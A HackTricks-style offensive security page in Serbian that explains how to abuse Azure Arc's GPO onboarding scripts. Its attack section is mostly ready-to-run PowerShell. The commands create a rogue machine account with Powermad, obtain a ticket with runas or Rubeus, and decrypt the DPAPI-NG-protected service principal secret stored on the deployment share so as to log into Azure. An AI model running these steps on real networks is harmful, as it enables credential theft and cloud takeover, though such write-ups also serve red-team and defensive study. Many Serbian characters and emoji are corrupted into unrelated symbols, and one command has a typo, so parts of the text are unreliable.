# Az - Azure Arc Vulnerable GPO Deploy Script

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

- Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
- Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
- Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
- **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
- **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### Identifikacija Problema

Azure Arc omogu캖ava integraciju novih internih servera (pridru쬰nih serverskih domena) u Azure Arc kori코캖enjem metode Group Policy Object (GPO). Da bi olak코ao ovaj proces, Microsoft pru쬬 set alata za implementaciju neophodnih za pokretanje postupka u캜lanjivanja. Unutar ArcEnableServerGroupPolicy.zip fajla, mogu se prona캖i slede캖i skriptovi: DeployGPO.ps1, EnableAzureArc.ps1 i AzureArcDeployment.psm1.

Prilikom izvr코avanja, DeployGPO.ps1 skript vr코i slede캖e akcije:

1. Kreira Azure Arc Servers Onboarding GPO unutar lokalnog domena.
2. Kopira EnableAzureArc.ps1 skript za u캜lanjivanje na odre캠eni mre쬹i deljeni resurs kreiran za proces u캜lanjivanja, koji tako캠e sadr쬴 Windows instalacioni paket.

Prilikom pokretanja ovog skripta, sistem administratori moraju obezbediti dva glavna parametra: **ServicePrincipalId** i **ServicePrincipalClientSecret**. Dodatno, potrebni su i drugi parametri kao 코to su domen, FQDN servera koji hostuje deljeni resurs, i naziv deljenog resursa. Dodatni detalji kao 코to su ID zakupca, grupa resursa i ostale neophodne informacije tako캠e moraju biti obezbe캠ene skriptu.

Enkriptovan tajni klju캜 se generi코e u AzureArcDeploy direktorijumu na odre캠enom deljenom resursu kori코캖enjem DPAPI-NG enkripcije. Enkriptovani tajni klju캜 se 캜uva u fajlu nazvanom encryptedServicePrincipalSecret. Dokazi o ovome mogu se prona캖i u DeployGPO.ps1 skriptu, gde se enkripcija vr코i pozivanjem ProtectBase64 sa $descriptor i $ServicePrincipalSecret kao ulazima. Deskriptor se sastoji od SID-ova grupa Domain Computer i Domain Controller, obezbe캠uju캖i da tajni klju캜 mo쬰 biti dekriptovan samo od strane grupa za bezbednost Domain Controllers i Domain Computers, kako je navedeno u komentarima skripta.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Eksploatacija

Imamo slede캖e uslove:

1. Uspe코no smo prodrli u internu mre쬿.
2. Imamo mogu캖nost da kreiramo ili preuzmemo kontrolu nad korisni캜kim ra캜unom na ra캜unaru unutar Active Directory-ja.
3. Otkrili smo deljeni mre쬹i resurs koji sadr쬴 direktorijum AzureArcDeploy.

Postoji nekoliko metoda za dobijanje korisni캜kog ra캜una ma코ine unutar AD okru쬰nja. Jedna od naj캜e코캖ih je iskori코캖avanje kvote korisni캜kog ra캜una ma코ine. Druga metoda uklju캜uje kompromitovanje korisni캜kog ra캜una ma코ine putem ranjivih ACL-ova ili razli캜itih drugih lo코ih konfiguracija.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Kada se dobije nalog ma코ine, mogu캖e je autentifikovati se koriste캖i ovaj nalog. Mo쬰mo koristiti komandu runas.exe sa zastavicom netonly ili koristiti pass-the-ticket sa Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Kada imamo TGT za nalog na코eg ra캜unara sa캜uvan u memoriji, mo쬰mo koristiti slede캖i skript za de코ifrovanje tajne servisnog principala.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternativno, mo쬰mo koristiti [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

U ovom trenutku, mo쬰mo prikupiti preostale informacije potrebne za povezivanje sa Azure-om iz ArcInfo.json datoteke, koja je sme코tena na istoj mre쬹oj deljenoj lokaciji kao i datoteka encryptedServicePrincipalSecret. Ova datoteka sadr쬴 detalje poput: TenantId, servicePrincipalClientId, ResourceGroup, i vi코e. Sa ovim informacijama, mo쬰mo koristiti Azure CLI za autentifikaciju kao kompromitovani servisni princip.

## Reference

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

- Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
- Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
- Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
- **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
- **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
